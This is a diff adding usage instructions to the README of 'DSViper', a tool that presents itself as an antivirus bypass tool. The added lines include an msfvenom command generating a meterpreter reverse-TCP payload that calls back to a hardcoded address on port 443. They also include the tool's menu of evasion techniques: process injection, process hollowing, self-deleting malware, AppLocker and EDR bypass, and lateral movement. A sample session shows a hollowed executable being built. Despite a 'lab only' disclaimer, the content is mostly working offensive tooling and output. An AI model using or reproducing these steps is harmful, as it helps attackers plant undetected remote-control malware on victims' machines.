@@ -39,7 +39,42 @@ Make the `DSViper` executable and run it:
 
 ```bash
 chmod +x DSViper
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin
 ./DSViper
+
+░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+                                                                                             
+................................................ 
+                      AntiVirus Bypass Tool (v.0.2.1)   
+---------------------------------------------------------                                                                                                            
+Created by Dhanush Gowda(dagowda) and Sumanth Vanki                                                                                                                  
+---------------------------------------------------------                                                                                                            
+................................................                                                                                                                     
+                                                                                                                                                                     
+                                                                                                                                                                     
+You sure you want to Continue?(Use it ethically, and in lab enviroments only) y/n: y                                                                                 
+Enter your payload choice:                                                                                                                                           
+1.)self-injection(XOR)                                                                                                                                               
+2.)self-injection(AES)                                                                                                                                               
+3.)Process Injection(spoolsv)(Can be used for lateral movement)                                                                                                      
+4.)Process Hollow                                                                                                                                                    
+5.)Self Deleting Malware(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE)                                                                                 
+6.)DLL side-load/rundll32 applocker bypass                                                                                                                           
+7.)Process Injection(explorer.exe)                                                                                                                                   
+8.)Powershell(Will bypass with cloud detections enabled as well)(Make sure to run this payload twice)(use x64 payload only)                                          
+9.)Applocker bypass small shellcodes(Make sure to use x86 payloads)(Also make sure to change the .exe file name after everyrun on the same victim)(Make sure you run this payload twice)                                                                                                                                                  
+10.)Applocker bypass Havoc/large shellcodes(use x86 payloads only)                                                                                                   
+11.)Indirect Syscall(Windows 10)(Possible EDR bypass loader)                                                                                                         
+>4                                                                                                                                                                   
+Please type in the shellcode file name: payload.bin                                                                                                                  
+Selected Havoc payload blind eye 1                                                                                                                                   
+[*]Payload successfully created as DSViper_hollow.exe
 ```
 
 ---
